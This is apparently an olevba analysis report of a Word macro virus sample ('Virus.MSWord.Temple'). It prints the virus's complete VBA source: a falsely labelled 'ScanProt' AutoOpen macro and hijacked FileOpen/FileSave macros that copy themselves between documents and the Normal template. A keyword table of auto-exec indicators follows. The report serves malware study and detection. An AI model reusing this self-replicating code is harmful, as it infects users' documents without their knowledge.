olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Temple
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Temple - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO TempFileOpen.bas 
in file: ./Virus.MSWord.Temple - OLE stream: 'Macros/VBA/TempFileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TempFileOpen.MAIN"

    On Error GoTo -1: On Error GoTo ErrorHandler

    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
    WordBasic.CurValues.FileOpen dlg
    WordBasic.Dialog.FileOpen dlg
    WordBasic.FileOpen dlg
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":TempAutoExec"
    WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":TempFileSave"
    WordBasic.MacroCopy "Global:FileOpen", WordBasic.[FileName$]() + ":TempFileOpen"
    WordBasic.MacroCopy "Global:TempAutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.FileSaveAs Format:=1

    GoTo Finished

ErrorHandler:

    Select Case Err.Number

        Case Else

    End Select

Finished:


End Sub
-------------------------------------------------------------------------------
VBA MACRO TempAutoExec.bas 
in file: ./Virus.MSWord.Temple - OLE stream: 'Macros/VBA/TempAutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()

    On Error GoTo -1: On Error GoTo ErrorHandler

    GoTo Finished

ErrorHandler:

    Select Case Err.Number

        Case Else

    End Select

Finished:

End Sub
-------------------------------------------------------------------------------
VBA MACRO TempFileSave.bas 
in file: ./Virus.MSWord.Temple - OLE stream: 'Macros/VBA/TempFileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.TempFileSave.MAIN"

    On Error GoTo -1: On Error GoTo ErrorHandler

    WordBasic.FileSave
    WordBasic.FileSaveAs Format:=1
    WordBasic.MacroCopy "Global:AutoExec", WordBasic.[FileName$]() + ":TempAutoExec"
    WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":TempFileSave"
    WordBasic.MacroCopy "Global:FileOpen", WordBasic.[FileName$]() + ":TempFileOpen"
    WordBasic.MacroCopy "Global:TempAutoOpen", WordBasic.[FileName$]() + ":AutoOpen"
    WordBasic.FileSaveAs Format:=1

    GoTo Finished

ErrorHandler:

    Select Case Err.Number

        Case Else

    End Select

Finished:

End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Temple - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"

    On Error GoTo -1: On Error GoTo ErrorHandler

    WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempAutoExec", "Global:AutoExec"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileSave", "Global:FileSave"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":TempFileOpen", "Global:FileOpen"
    WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:TempAutoOpen"

    GoTo Finished

ErrorHandler:

    Select Case Err.Number

        Case Else

    End Select

Finished:

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

